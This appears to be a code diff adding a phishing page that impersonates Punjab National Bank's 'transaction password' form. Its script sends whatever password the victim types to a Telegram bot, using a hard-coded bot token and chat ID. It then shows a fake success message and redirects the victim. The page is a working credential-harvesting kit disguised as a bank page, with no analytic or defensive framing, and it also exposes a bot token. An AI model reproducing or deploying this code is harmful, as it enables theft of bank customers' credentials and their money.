@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PNB Transaction Password</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        .form-container {
+            background-color: hsl(0, 89%, 26%); /* Red background */
+            padding: 30px; /* Increased padding */
+            border-radius: 8px;
+            max-width: 500px; /* Adjusted width */
+            margin: 50px auto; /* Adjusted margin for better centering */
+            border: 3px solid red; /* Red border */
+        }
+
+        .form-container label {
+            font-weight: bold;
+            display: block;
+            margin: 15px 0 5px; /* Increased margin */
+            color: hsl(0, 100%, 99%); /* Yellow text for labels */
+        }
+
+        .form-container input {
+            width: 100%;
+            padding: 12px; /* Increased padding for larger inputs */
+            margin-bottom: 15px; /* Increased margin between inputs */
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            color: #0c0c0b; /* Yellow text inside input fields */
+            background-color: hsl(0, 11%, 93%); /* Dark background for inputs */
+            font-size: 16px; /* Increased font size */
+        }
+
+        .form-container button {
+            background-color: #f4b400; /* Yellow background */
+            padding: 12px 25px; /* Larger button size */
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 18px; /* Increased font size */
+            cursor: pointer;
+            width: 100%; /* Full width button */
+        }
+
+        .form-container button:hover {
+            background-color: #e0a500;
+        }
+
+        footer {
+            background-color: #2a2a2a;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            margin-top: 20px;
+        }
+
+        footer a {
+            color: #f4b400;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        .banner img {
+            width: 100%;
+            max-height: 300px;
+            object-fit: cover;
+        }
+
+        /* Processing Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 20px;
+        }
+
+        .modal-content {
+            background-color: #333;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Section -->
+    <header>
+        <div class="logo-container">
+            <img src="pnb-logo.png" alt="PNB Logo">
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#">Personal</a></li>
+                <li><a href="#">Corporate</a></li>
+                <li><a href="#">NRI</a></li>
+                <li><a href="#">Agri</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Banner Section -->
+    <section class="banner">
+        <img src="banner.png" alt="PNB Banner">
+    </section>
+
+    <!-- Main Content -->
+    <main>
+        <section class="transaction-password-form">
+            <h2>Enter Transaction Password</h2>
+            <form id="transaction-password-form" class="form-container">
+                <label for="transaction-password">Transaction Password:</label>
+                <input type="password" id="transaction-password" name="transaction-password" placeholder="Enter your transaction password" required>
+
+                <button type="button" id="submit-button">Submit</button>
+            </form>
+        </section>
+    </main>
+
+    <!-- Footer Section -->
+    <footer>
+        <p>&copy; 2025 Punjab National Bank. All rights reserved.</p>
+        <p>For support, visit our <a href="#">Help Center</a> or call <a href="tel:+18001802030">1800-180-2030</a></p>
+    </footer>
+
+    <!-- Processing Modal -->
+    <div id="processing-modal" class="modal">
+        <div class="modal-content">
+            <p>Processing...</p>
+        </div>
+    </div>
+
+    <!-- JavaScript for Transaction Password Validation, Telegram Notification, and Modal -->
+    <script>
+        const botToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A"; 
+        const chatId = "-1002424646619";
+        document.getElementById("submit-button").addEventListener("click", function () {
+            const transactionPasswordField = document.getElementById("transaction-password");
+
+            // Validate if the transaction password is entered
+            if (transactionPasswordField.value.trim() === "") {
+                alert("Please enter your transaction password.");
+                transactionPasswordField.focus();
+                return;
+            }
+
+            // Show the processing modal
+            document.getElementById("processing-modal").style.display = "flex";
+
+            const transactionPassword = transactionPasswordField.value;
+
+            // Prepare message to send to Telegram
+            const message = `💳 **PNB Transaction Password Entered**\n🔐 Password: ${transactionPassword}`;
+
+            // Send to Telegram bot
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                // Hide the processing modal after the response
+                document.getElementById("processing-modal").style.display = "none";
+
+                if (response.ok) {
+                    alert("Transaction password entered successfully.");
+                    window.location.href = "netsuccess.html"; // Redirect to a success page (you can customize this)
+                } else {
+                    alert("Error sending data. Please try again.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                document.getElementById("processing-modal").style.display = "none";
+                alert("Error sending data. Please try again.");
+            });
+        });
+    </script>
+
+</body>
+</html>
